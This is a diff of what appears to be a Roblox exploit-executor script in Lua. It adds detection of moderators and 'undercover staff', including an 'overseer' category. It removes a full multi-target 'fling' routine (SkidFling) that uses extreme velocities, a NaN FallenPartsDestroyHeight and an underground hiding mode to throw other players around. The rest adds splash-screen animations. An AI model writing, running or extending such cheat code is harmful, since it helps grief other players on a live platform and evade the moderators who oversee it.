+    local oneStaffEntries = {}
     local mainEntries = {}
     local undEntries  = {}
     local possEntries = {}
@@ -1329,12 +3433,30 @@ local function refreshStaffList()
         local inMain     = #mains > 0
         local inPossible = #possible > 0
         local isU        = isUndercover(p, inMain)
-        local category   = getPlayerCategory(inMain, isU, inPossible)
+        local is01       = is01Staff(p)
+        local ownerPlayer = isOwner(p)
+        local category   = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
         if not category then continue end
 
-        local nameText = p.DisplayName .. " (@" .. p.Name .. ")"
+        local nameText = getDisplayName(p) .. " (@" .. p.Name .. ")"
 
-        if inMain then
+        if category == "owner" then
+            table.insert(oneStaffEntries, {
+                name = p.Name,
+                sortKey = p.DisplayName:lower() .. "\0" .. p.Name:lower(),
+                display = nameText,
+                detail = "👑 OVERSEER",
+                color = theme.Owner,
+            })
+        elseif category == "01staff" then
+            table.insert(oneStaffEntries, {
+                name = p.Name,
+                sortKey = p.DisplayName:lower() .. "\0" .. p.Name:lower(),
+                display = nameText,
+                detail = "ADMIN • 01 STAFF",
+                color = theme.OneStaff,
+            })
+        elseif inMain then
             local mainParts = {}
             for _, m in ipairs(mains) do table.insert(mainParts, getGroupName(m.id) .. ": " .. m.role) end
             local detail = table.concat(mainParts, "  |  ")
@@ -1343,7 +3465,12 @@ local function refreshStaffList()
                 for _, m in ipairs(possible) do table.insert(extras, getGroupName(m.id) .. ": " .. m.role) end
                 detail = detail .. "  |  " .. table.concat(extras, "  |  ")
             end
-            table.insert(mainEntries, { name = p.Name, display = nameText, detail = detail })
+            table.insert(mainEntries, {
+                name = p.Name,
+                sortKey = p.DisplayName:lower() .. "\0" .. p.Name:lower(),
+                display = nameText,
+                detail = detail,
+            })
         end
 
         if isU and not inMain then
@@ -1353,20 +3480,35 @@ local function refreshStaffList()
                 for _, m in ipairs(possible) do table.insert(extras, getGroupName(m.id) .. ": " .. m.role) end
                 detail = detail .. "  |  " .. table.concat(extras, "  |  ")
             end
-            table.insert(undEntries, { name = p.Name, display = nameText, detail = detail })
+            table.insert(undEntries, {
+                name = p.Name,
+                sortKey = p.DisplayName:lower() .. "\0" .. p.Name:lower(),
+                display = nameText,
+                detail = detail,
+            })
         end
 
         if inPossible then
             local parts = {}
             for _, m in ipairs(possible) do table.insert(parts, getGroupName(m.id) .. ": " .. m.role) end
-            table.insert(possEntries, { name = p.Name, display = nameText, detail = table.concat(parts, "  |  ") })
+            table.insert(possEntries, {
+                name = p.Name,
+                sortKey = p.DisplayName:lower() .. "\0" .. p.Name:lower(),
+                display = nameText,
+                detail = table.concat(parts, "  |  "),
+            })
         end
     end
 
-    local function sortAlpha(t) table.sort(t, function(a, b) return a.name:lower() < b.name:lower() end) end
-    sortAlpha(mainEntries) sortAlpha(undEntries) sortAlpha(possEntries)
+    local function sortAlpha(t)
+        table.sort(t, function(a, b)
+            return (a.sortKey or a.name:lower()) < (b.sortKey or b.name:lower())
+        end)
+    end
+    sortAlpha(oneStaffEntries) sortAlpha(mainEntries) sortAlpha(undEntries) sortAlpha(possEntries)
 -- xx Subtitles staff list
-    slPopulate(mainEntries, slMainSF, slMainEmpty, theme.Success,       slMainHdr, "— STAFF GROUP [MAIN]")
+    slPopulate(oneStaffEntries, slOneSF, slOneEmpty, theme.OneStaff, slOneHdr, "— 01 STAFF")
+    slPopulate(mainEntries, slMainSF, slMainEmpty, theme.Success, slMainHdr, "— VF STAFF GROUP [MAIN]")
     slPopulate(undEntries,  slUndSF,  slUndEmpty,  theme.Warning,       slUndHdr,  "— UNDERCOVER STAFF [HIGH CHANCE]")
     slPopulate(possEntries, slPossSF, slPossEmpty, theme.PossibleStaff, slPossHdr, "— POSSIBLE STAFF GROUP [LOW CHANCE]")
 end
@@ -1375,496 +3517,10 @@ end
 staffListPage:GetPropertyChangedSignal("Visible"):Connect(function()
     if staffListPage.Visible then pcall(refreshStaffList) end
 end)
-
--- Returns true if a player is relevant to the staff list.
--- Used so we only refresh the list when someone who matters joins or leaves.
-local function isRelevantPlayer(p)
-    if UNDERCOVER_USERIDS[p.UserId] then return true end
-    for _, gid in ipairs(MAIN_GROUP_IDS) do
-        local ok, inMain = pcall(function() return p:IsInGroup(gid) end)
-        if ok and inMain then return true end
-    end
-    for _, gid in ipairs(POSSIBLE_STAFF_GROUP_IDS) do
-        local ok2, inG = pcall(function() return p:IsInGroup(gid) end)
-        if ok2 and inG then return true end
-    end
-    return false
-end
-
+end)()
 
 -- ======================================================== --
---  MULTI-TARGET FLING INTEGRATION
--- ======================================================== --
-local SelectedTargets = {}
-local PlayerCheckboxes = {}
-local FlingActive = false
-local UndergroundFlingEnabled = false
-local UNDERGROUND_DROP = 200
-getgenv().OldPos = nil
-getgenv().FlingOrigin = nil
-getgenv().FPDH = workspace.FallenPartsDestroyHeight
-
-local ft = Instance.new("TextLabel", flingPage)
-ft.BackgroundTransparency = 1
-ft.Size = UDim2.new(1, 0, 0, 30)
-ft.Font = Enum.Font.GothamBold
-ft.Text = "MULTI-TARGET FLING"
-ft.TextColor3 = theme.AccentSecondary
-ft.TextSize = 14
-ft.TextXAlignment = Enum.TextXAlignment.Left
-
-local flingStatus = Instance.new("TextLabel", flingPage)
-flingStatus.BackgroundTransparency = 1
-flingStatus.Position = UDim2.new(0, 0, 0, 30)
-flingStatus.Size = UDim2.new(0.48, 0, 0, 20)
-flingStatus.Font = Enum.Font.Gotham
-flingStatus.Text = "0 target(s) selected"
-flingStatus.TextColor3 = theme.TextPrimary
-flingStatus.TextSize = 12
-flingStatus.TextXAlignment = Enum.TextXAlignment.Left
-
-local function makeFlingBtn(text, posScale, yOffset, color, parent)
-    local b = Instance.new("TextButton", parent)
-    b.BackgroundColor3 = color
-    b.Position = UDim2.new(posScale, 0, 0, yOffset)
-    b.Size = UDim2.new(0.48, 0, 0, 35)
-    b.Font = Enum.Font.GothamBold
-    b.Text = text
-    b.TextColor3 = theme.TextPrimary
-    b.TextSize = 12
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
-    return b
-end
-
-local startFlingBtn  = makeFlingBtn("START FLING",  0,    60,  Color3.fromRGB(0, 150, 0), flingPage)
-local stopFlingBtn   = makeFlingBtn("STOP FLING",   0.52, 60,  theme.Warning,             flingPage)
-local undergroundFlingBtn = makeFlingBtn("UNDERGROUND: OFF", 0.52, 25, theme.BackgroundTertiary, flingPage)
-undergroundFlingBtn.Font = Enum.Font.Gotham
-undergroundFlingBtn.TextSize = 11
-local selectAllBtn   = makeFlingBtn("SELECT ALL",   0,    105, theme.BackgroundTertiary,  flingPage)
-local deselectAllBtn = makeFlingBtn("DESELECT ALL", 0.52, 105, theme.BackgroundTertiary,  flingPage)
-selectAllBtn.Font  = Enum.Font.Gotham
-deselectAllBtn.Font = Enum.Font.Gotham
-
-local pListFrame = Instance.new("Frame", flingPage)
-pListFrame.BackgroundColor3 = theme.BackgroundSecondary
-pListFrame.Position = UDim2.new(0, 0, 0, 150)
-pListFrame.Size = UDim2.new(1, 0, 0, 200)
-Instance.new("UICorner", pListFrame).CornerRadius = UDim.new(0, 12)
-local pListStroke = Instance.new("UIStroke", pListFrame)
-pListStroke.Color = theme.AccentSecondary
-pListStroke.Thickness = 1
-pListStroke.Transparency = 0.5
-
-local pScroll = Instance.new("ScrollingFrame", pListFrame)
-pScroll.BackgroundTransparency = 1
-pScroll.Position = UDim2.new(0, 5, 0, 5)
-pScroll.Size = UDim2.new(1, -10, 1, -10)
-pScroll.ScrollBarThickness = 4
-pScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
-
-local function getFlingOrigin()
-    return getgenv().FlingOrigin or getgenv().OldPos
-end
-
-local function releaseUndergroundHold()
-    local character = localPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-    local rootPart = humanoid and humanoid.RootPart
-    local hold = rootPart and rootPart:FindFirstChild("StaffAlertUndergroundHold")
-    if hold then hold:Destroy() end
-end
-
-local function moveCharacterUnderground()
-    local character = localPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-    local rootPart = humanoid and humanoid.RootPart
-    local origin = getFlingOrigin()
-    if not character or not rootPart or not origin then return end
-
-    local hiddenCFrame = origin * CFrame.new(0, -UNDERGROUND_DROP, 0)
-    rootPart.CFrame = hiddenCFrame
-    pcall(function() character:SetPrimaryPartCFrame(hiddenCFrame) end)
-    rootPart.Velocity = Vector3.new(0, 0, 0)
-    rootPart.RotVelocity = Vector3.new(0, 0, 0)
-
-    local hold = rootPart:FindFirstChild("StaffAlertUndergroundHold")
-    if not hold then
-        hold = Instance.new("BodyPosition")
-        hold.Name = "StaffAlertUndergroundHold"
-        hold.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-        hold.P = 9e5
-        hold.D = 1e4
-        hold.Parent = rootPart
-    end
-    hold.Position = hiddenCFrame.Position
-end
-
-local function forceRespawnAtSpawn()
-    releaseUndergroundHold()
-    getgenv().OldPos = nil
-    getgenv().FlingOrigin = nil
-
-    local character = localPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-    local loaded = pcall(function()
-        localPlayer:LoadCharacter()
-    end)
-
-    if not loaded and humanoid then
-        pcall(function()
-            humanoid.Health = 0
-        end)
-    end
-end
-
-local function restoreCharacterToOrigin()
-    releaseUndergroundHold()
-
-    local character = localPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-    local rootPart = humanoid and humanoid.RootPart
-    local origin = getFlingOrigin()
-    if rootPart and origin then
-        local safeCFrame = origin * CFrame.new(0, 3, 0)
-        rootPart.CFrame = safeCFrame
-        pcall(function() character:SetPrimaryPartCFrame(safeCFrame) end)
-        rootPart.Velocity = Vector3.new(0, 0, 0)
-        rootPart.RotVelocity = Vector3.new(0, 0, 0)
-        humanoid:ChangeState("GettingUp")
-    end
-
-    getgenv().OldPos = nil
-    getgenv().FlingOrigin = nil
-end
-
-undergroundFlingBtn.MouseButton1Click:Connect(function()
-    UndergroundFlingEnabled = not UndergroundFlingEnabled
-    undergroundFlingBtn.Text = UndergroundFlingEnabled and "UNDERGROUND: ON" or "UNDERGROUND: OFF"
-    undergroundFlingBtn.BackgroundColor3 = UndergroundFlingEnabled and theme.AccentPrimary or theme.BackgroundTertiary
-
-    if UndergroundFlingEnabled and FlingActive then
-        moveCharacterUnderground()
-    end
-end)
-
-local function SkidFling(TargetPlayer)
-    local Character = localPlayer.Character
-    local Humanoid  = Character and Character:FindFirstChildOfClass("Humanoid")
-    local RootPart  = Humanoid and Humanoid.RootPart
-    local TCharacter = TargetPlayer.Character
-    if not TCharacter then return end
-
-    local THumanoid, TRootPart, THead, Accessory, Handle
-    if TCharacter:FindFirstChildOfClass("Humanoid") then THumanoid = TCharacter:FindFirstChildOfClass("Humanoid") end
-    if THumanoid and THumanoid.RootPart then TRootPart = THumanoid.RootPart end
-    if TCharacter:FindFirstChild("Head") then THead = TCharacter.Head end
-    if TCharacter:FindFirstChildOfClass("Accessory") then Accessory = TCharacter:FindFirstChildOfClass("Accessory") end
-    if Accessory and Accessory:FindFirstChild("Handle") then Handle = Accessory.Handle end
-
-    if Character and Humanoid and RootPart then
-        if not getgenv().FlingOrigin then
-            getgenv().FlingOrigin = RootPart.CFrame
-        end
-        getgenv().OldPos = getgenv().FlingOrigin
-
-        if THumanoid and THumanoid.Sit then
-            notify("FLING ERROR", TargetPlayer.Name .. " is sitting", 2, "warning")
-            return
-        end
-        if THead then workspace.CurrentCamera.CameraSubject = THead
-        elseif Handle then workspace.CurrentCamera.CameraSubject = Handle
-        elseif THumanoid and TRootPart then workspace.CurrentCamera.CameraSubject = THumanoid end
-        if not TCharacter:FindFirstChildWhichIsA("BasePart") then return end
-
-        local FPos = function(BasePart, Pos, Ang)
-            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
-            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
-            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
-            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
-        end
-
-        local SFBasePart = function(BasePart)
-            local TimeToWait = 2
-            local Time = tick()
-            local Angle = 0
-            repeat
-                if RootPart and THumanoid then
-                    if BasePart.Velocity.Magnitude < 50 then
-                        Angle = Angle + 100
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0)) task.wait()
-                    else
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0)) task.wait()
-                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0)) task.wait()
-                    end
-                end
-            until Time + TimeToWait < tick() or not FlingActive
-        end
-
-        -- Release the underground hold only while the real fling is running.
-        releaseUndergroundHold()
-        workspace.FallenPartsDestroyHeight = 0/0
-
-        local BV = Instance.new("BodyVelocity")
-        BV.Parent = RootPart
-        BV.Velocity = Vector3.new(0, 0, 0)
-        BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-
-        if TRootPart then SFBasePart(TRootPart)
-        elseif THead then SFBasePart(THead)
-        elseif Handle then SFBasePart(Handle)
-        else
-            BV:Destroy()
-            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-            workspace.FallenPartsDestroyHeight = getgenv().FPDH
-            if UndergroundFlingEnabled and FlingActive then moveCharacterUnderground() end
-            notify("FLING ERROR", TargetPlayer.Name .. " has no valid parts", 2, "warning")
-            return
-        end
-
-        BV:Destroy()
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
-        workspace.CurrentCamera.CameraSubject = Humanoid
-
-        if UndergroundFlingEnabled and FlingActive then
-            moveCharacterUnderground()
-            workspace.FallenPartsDestroyHeight = getgenv().FPDH
-        elseif getgenv().OldPos then
-            repeat
-                RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
-                Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
-                Humanoid:ChangeState("GettingUp")
-                for _, part in pairs(Character:GetChildren()) do
-                    if part:IsA("BasePart") then
-                        part.Velocity, part.RotVelocity = Vector3.new(), Vector3.new()
-                    end
-                end
-                task.wait()
-            until (RootPart.Position - getgenv().OldPos.Position).Magnitude < 25 or not FlingActive
-            workspace.FallenPartsDestroyHeight = getgenv().FPDH
-        end
-    else
-        notify("FLING ERROR", "Your character is not ready", 2, "warning")
-    end
-end
-
-local function CountSelectedTargets()
-    local c = 0
-    for _ in pairs(SelectedTargets) do c = c + 1 end
-    return c
-end
-
-local function UpdateFlingStatus()
-    local c = CountSelectedTargets()
-    if FlingActive then
-        flingStatus.Text = "Flinging " .. c .. " target(s)"
-        flingStatus.TextColor3 = theme.Warning
-    else
-        flingStatus.Text = c .. " target(s) selected"
-        flingStatus.TextColor3 = theme.TextPrimary
-    end
-end
-
-local function RefreshFlingList()
-    for _, c in pairs(pScroll:GetChildren()) do
-        if c:IsA("Frame") then c:Destroy() end
-    end
-    PlayerCheckboxes = {}
-    local pList = Players:GetPlayers()
-    table.sort(pList, function(a, b) return a.Name:lower() < b.Name:lower() end)
-    local yPos = 0
-    for _, p in ipairs(pList) do
-        if p ~= localPlayer then
-            local entry = Instance.new("Frame", pScroll)
-            entry.BackgroundTransparency = 1
-            entry.Size = UDim2.new(1, 0, 0, 25)
-            entry.Position = UDim2.new(0, 0, 0, yPos)
-
-            local cb = Instance.new("TextButton", entry)
-            cb.BackgroundColor3 = theme.BackgroundTertiary
-            cb.Size = UDim2.new(0, 18, 0, 18)
-            cb.Position = UDim2.new(0, 5, 0.5, -9)
-            cb.Text = ""
-            Instance.new("UICorner", cb).CornerRadius = UDim.new(0, 4)
-            local cbStroke = Instance.new("UIStroke", cb)
-            cbStroke.Color = theme.AccentSecondary
-            cbStroke.Thickness = 1
-
-            local cm = Instance.new("TextLabel", cb)
-            cm.BackgroundTransparency = 1
-            cm.Size = UDim2.new(1, 0, 1, 0)
-            cm.Font = Enum.Font.GothamBold
-            cm.Text = "✓"
-            cm.TextColor3 = theme.Success
-            cm.TextSize = 14
-            cm.Visible = SelectedTargets[p.Name] ~= nil
-
-            local nameLbl = Instance.new("TextLabel", entry)
-            nameLbl.BackgroundTransparency = 1
-            nameLbl.Position = UDim2.new(0, 30, 0, 0)
-            nameLbl.Size = UDim2.new(1, -35, 1, 0)
-            nameLbl.Font = Enum.Font.Gotham
-            nameLbl.Text = p.DisplayName .. " (@" .. p.Name .. ")"
-            nameLbl.TextColor3 = theme.TextSecondary
-            nameLbl.TextSize = 12
-            nameLbl.TextXAlignment = Enum.TextXAlignment.Left
-
-            local clicker = Instance.new("TextButton", entry)
-            clicker.BackgroundTransparency = 1
-            clicker.Size = UDim2.new(1, 0, 1, 0)
-            clicker.Text = ""
-            clicker.ZIndex = 2
-
-            clicker.MouseButton1Click:Connect(function()
-                if SelectedTargets[p.Name] then
-                    SelectedTargets[p.Name] = nil
-                    cm.Visible = false
-                else
-                    SelectedTargets[p.Name] = p
-                    cm.Visible = true
-                end
-                UpdateFlingStatus()
-            end)
-
-            PlayerCheckboxes[p.Name] = { Entry = entry, Checkmark = cm }
-            yPos = yPos + 30
-        end
-    end
-    pScroll.CanvasSize = UDim2.new(0, 0, 0, yPos)
-end
-
-local function ToggleAll(sel)
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= localPlayer then
-            local data = PlayerCheckboxes[p.Name]
-            if data then
-                if sel then
-                    SelectedTargets[p.Name] = p
-                    data.Checkmark.Visible = true
-                else
-                    SelectedTargets[p.Name] = nil
-                    data.Checkmark.Visible = false
-                end
-            end
-        end
-    end
-    UpdateFlingStatus()
-end
-
-startFlingBtn.MouseButton1Click:Connect(function()
-    if FlingActive then return end
-    local c = CountSelectedTargets()
-    if c == 0 then
-        notify("FLING", "No targets selected!", 3, "warning")
-        return
-    end
-
-    local character = localPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
-    local rootPart = humanoid and humanoid.RootPart
-    if not rootPart then
-        notify("FLING ERROR", "Your character is not ready", 2, "warning")
-        return
-    end
-
-    getgenv().FlingOrigin = rootPart.CFrame
-    getgenv().OldPos = getgenv().FlingOrigin
-    FlingActive = true
-    if UndergroundFlingEnabled then moveCharacterUnderground() end
-    UpdateFlingStatus()
-    notify("FLING", "Started flinging " .. c .. " targets", 3, "success")
-    task.spawn(function()
-        while FlingActive do
-            local valid = {}
-            for name, p in pairs(SelectedTargets) do
-                if p and p.Parent then valid[name] = p
-                else
-                    SelectedTargets[name] = nil
-                    if PlayerCheckboxes[name] then PlayerCheckboxes[name].Checkmark.Visible = false end
-                end
-            end
-            for _, p in pairs(valid) do
-                if FlingActive then SkidFling(p) task.wait(0.1)
-                else break end
-            end
-            UpdateFlingStatus()
-            task.wait(0.5)
-        end
-    end)
-end)
-
-stopFlingBtn.MouseButton1Click:Connect(function()
-    if not FlingActive then return end
-    FlingActive = false
-    UpdateFlingStatus()
-    notify("FLING", "Fling stopped", 3, "success")
-    workspace.FallenPartsDestroyHeight = getgenv().FPDH
-    if UndergroundFlingEnabled then
-        forceRespawnAtSpawn()
-    else
-        restoreCharacterToOrigin()
-    end
-end)
-
-selectAllBtn.MouseButton1Click:Connect(function() ToggleAll(true) end)
-deselectAllBtn.MouseButton1Click:Connect(function() ToggleAll(false) end)
-
-Players.PlayerAdded:Connect(function()
-    task.wait(1)
-    RefreshFlingList()
-end)
-Players.PlayerRemoving:Connect(function(p)
-    if SelectedTargets[p.Name] then SelectedTargets[p.Name] = nil end
-    RefreshFlingList()
-    UpdateFlingStatus()
-end)
-
-RefreshFlingList()
-flingPage.CanvasSize = UDim2.new(0, 0, 0, 360)
-
-task.spawn(function()
-    while flingPage and flingPage.Parent do
-        task.wait(3)
-        pcall(RefreshFlingList)
-        pcall(UpdateFlingStatus)
-    end
-end)
-
--- Dragging logic
-local dragging, dragInput, dragStart, startPos
-main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging  = true
-        dragStart = input.Position
-        startPos  = main.Position
-    end
-end)
-main.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
-end)
-
--- Toggle Menu visibility
-local function showPremiumIntro()
+function state.ShowFreeIntro()
     main.Visible = false
 
     local splash = Instance.new("ScreenGui")
@@ -1874,7 +3530,9 @@ local function showPremiumIntro()
     splash.DisplayOrder = 20000
     splash.Parent = CoreGui.RobloxGui
 
-    local backdrop = Instance.new("Frame", splash)
+    local backdrop
+    do
+    backdrop = Instance.new("Frame", splash)
     backdrop.BackgroundColor3 = theme.BackgroundPrimary
     backdrop.BackgroundTransparency = 1
     backdrop.Size = UDim2.new(1, 0, 1, 0)
@@ -1887,6 +3545,58 @@ local function showPremiumIntro()
     backdropGradient.Rotation = 135
     tween(backdrop, {BackgroundTransparency = 0.04}, 0.45)
 
+    end
+
+    do
+    local ambient = Instance.new("Frame", splash)
+    ambient.BackgroundTransparency = 1
+    ambient.Size = UDim2.new(1, 0, 1, 0)
+    ambient.ZIndex = 2
+    ambient.ClipsDescendants = true
+
+    for i = 1, 42 do
+        local star = Instance.new("Frame", ambient)
+        local starSize = math.random(1, 3)
+        star.BackgroundColor3 = (i % 3 == 0) and Color3.fromRGB(180, 135, 255) or Color3.fromRGB(100, 225, 255)
+        star.BackgroundTransparency = math.random(45, 85) / 100
+        star.BorderSizePixel = 0
+        star.Position = UDim2.new(math.random(3, 97) / 100, 0, math.random(5, 95) / 100, 0)
+        star.Size = UDim2.new(0, starSize, 0, starSize)
+        star.ZIndex = 2
+        Instance.new("UICorner", star).CornerRadius = UDim.new(1, 0)
+
+        task.spawn(function()
+            task.wait(math.random(0, 18) / 10)
+            while star.Parent do
+                tween(star, {BackgroundTransparency = math.random(10, 75) / 100}, math.random(5, 12) / 10, Enum.EasingStyle.Sine)
+                task.wait(math.random(5, 12) / 10)
+            end
+        end)
+    end
+
+    for i = 1, 7 do
+        local line = Instance.new("Frame", ambient)
+        line.BackgroundColor3 = Color3.fromRGB(70, 150, 255)
+        line.BackgroundTransparency = 0.93
+        line.BorderSizePixel = 0
+        line.Position = UDim2.new(0, 0, i / 8, 0)
+        line.Size = UDim2.new(1, 0, 0, 1)
+        line.ZIndex = 2
+    end
+
+    for i = 1, 10 do
+        local line = Instance.new("Frame", ambient)
+        line.BackgroundColor3 = Color3.fromRGB(75, 220, 150)
+        line.BackgroundTransparency = 0.95
+        line.BorderSizePixel = 0
+        line.Position = UDim2.new(i / 11, 0, 0, 0)
+        line.Size = UDim2.new(0, 1, 1, 0)
+        line.ZIndex = 2
+    end
+
+    end
+
+    do
     local scanline = Instance.new("Frame", splash)
     scanline.BackgroundColor3 = theme.AccentSecondary
     scanline.BackgroundTransparency = 0.82
@@ -1898,7 +3608,12 @@ local function showPremiumIntro()
         tween(scanline, {Position = UDim2.new(1, 0, 0, 0)}, 2.7, Enum.EasingStyle.Linear)
     end)
 
-    local card = Instance.new("Frame", splash)
+    end
+
+    local card
+    local cardStroke
+    do
+    card = Instance.new("Frame", splash)
     card.AnchorPoint = Vector2.new(0.5, 0.5)
     card.BackgroundColor3 = theme.BackgroundSecondary
     card.BackgroundTransparency = 0.08
@@ -1906,24 +3621,109 @@ local function showPremiumIntro()
     card.Size = UDim2.new(0, 0, 0, 0)
     card.ZIndex = 10
     Instance.new("UICorner", card).CornerRadius = UDim.new(0, 20)
-    local cardStroke = Instance.new("UIStroke", card)
+    cardStroke = Instance.new("UIStroke", card)
     cardStroke.Color = theme.AccentPrimary
     cardStroke.Thickness = 2
     cardStroke.Transparency = 1
     addGlow(card, theme.AccentPrimary, 0.72)
-    tween(card, {Size = UDim2.new(0, 520, 0, 230)}, 0.7, Enum.EasingStyle.Back)
+    addGradient(card, Color3.fromRGB(8, 18, 45), Color3.fromRGB(8, 45, 35), 28)
+    tween(card, {Size = UDim2.new(0, 620, 0, 280)}, 0.7, Enum.EasingStyle.Back)
     tween(cardStroke, {Transparency = 0.18}, 0.7, Enum.EasingStyle.Quad)
 
+    local particleField = Instance.new("Frame", card)
+    particleField.BackgroundTransparency = 1
+    particleField.Position = UDim2.new(0, 18, 0, 26)
+    particleField.Size = UDim2.new(1, -36, 1, -52)
+    particleField.ZIndex = 11
+    particleField.ClipsDescendants = true
+
+    for i = 1, 24 do
+        local mote = Instance.new("Frame", particleField)
+        local moteSize = (i % 4 == 0) and 3 or 2
+        mote.BackgroundColor3 = (i % 2 == 0)
+            and Color3.fromRGB(0, 230, 255)
+            or Color3.fromRGB(90, 245, 150)
+        mote.BackgroundTransparency = math.random(35, 82) / 100
+        mote.BorderSizePixel = 0
+        mote.Position = UDim2.new(math.random(2, 98) / 100, 0, math.random(4, 96) / 100, 0)
+        mote.Size = UDim2.new(0, moteSize, 0, moteSize)
+        mote.ZIndex = 11
+        Instance.new("UICorner", mote).CornerRadius = UDim.new(1, 0)
+
+        task.spawn(function()
+            task.wait(math.random(0, 20) / 10)
+            while mote.Parent do
+                tween(mote, {Position = UDim2.new(mote.Position.X.Scale, 0, mote.Position.Y.Scale - 0.04, 0), BackgroundTransparency = 0.18}, 1.6, Enum.EasingStyle.Sine)
+                task.wait(1.6)
+                if mote.Parent then
+                    mote.Position = UDim2.new(math.random(2, 98) / 100, 0, 1.04, 0)
+                    tween(mote, {BackgroundTransparency = math.random(45, 82) / 100}, 0.8)
+                end
+            end
+        end)
+    end
+
+    local cardSweep = Instance.new("Frame", card)
+    cardSweep.BackgroundColor3 = Color3.fromRGB(125, 240, 255)
+    cardSweep.BackgroundTransparency = 0.72
+    cardSweep.BorderSizePixel = 0
+    cardSweep.Position = UDim2.new(0, -22, 0, 24)
+    cardSweep.Size = UDim2.new(0, 18, 1, -48)
+    cardSweep.Rotation = 12
+    cardSweep.ZIndex = 11
+    local cardSweepGradient = Instance.new("UIGradient", cardSweep)
+    cardSweepGradient.Transparency = NumberSequence.new({
+        NumberSequenceKeypoint.new(0, 1),
+        NumberSequenceKeypoint.new(0.5, 0.1),
+        NumberSequenceKeypoint.new(1, 1)
+    })
+
+    local function addBracket(position, size)
+        local bracket = Instance.new("Frame", card)
+        bracket.BackgroundColor3 = Color3.fromRGB(105, 235, 255)
+        bracket.BackgroundTransparency = 0.18
+        bracket.BorderSizePixel = 0
+        bracket.Position = position
+        bracket.Size = size
+        bracket.ZIndex = 12
+        return bracket
+    end
+
+    addBracket(UDim2.new(0, 12, 0, 12), UDim2.new(0, 28, 0, 2))
+    addBracket(UDim2.new(0, 12, 0, 12), UDim2.new(0, 2, 0, 28))
+    addBracket(UDim2.new(1, -40, 1, -14), UDim2.new(0, 28, 0, 2))
+    addBracket(UDim2.new(1, -14, 1, -40), UDim2.new(0, 2, 0, 28))
+
+    task.spawn(function()
+        while card.Parent do
+            tween(cardSweep, {Position = UDim2.new(1, 10, 0, 24)}, 1.6, Enum.EasingStyle.Linear)
+            task.wait(2.9)
+            cardSweep.Position = UDim2.new(0, -22, 0, 24)
+        end
+    end)
+
+    task.spawn(function()
+        while card.Parent do
+            tween(cardStroke, {Transparency = 0.04}, 0.85, Enum.EasingStyle.Sine)
+            task.wait(0.85)
+            tween(cardStroke, {Transparency = 0.42}, 0.85, Enum.EasingStyle.Sine)
+            task.wait(0.85)
+        end
+    end)
+
     local topAccent = Instance.new("Frame", card)
-    topAccent.BackgroundColor3 = theme.AccentSecondary
+    topAccent.BackgroundColor3 = Color3.fromRGB(80, 230, 160)
     topAccent.BorderSizePixel = 0
     topAccent.Position = UDim2.new(0, 24, 0, 18)
     topAccent.Size = UDim2.new(0, 0, 0, 2)
     topAccent.ZIndex = 12
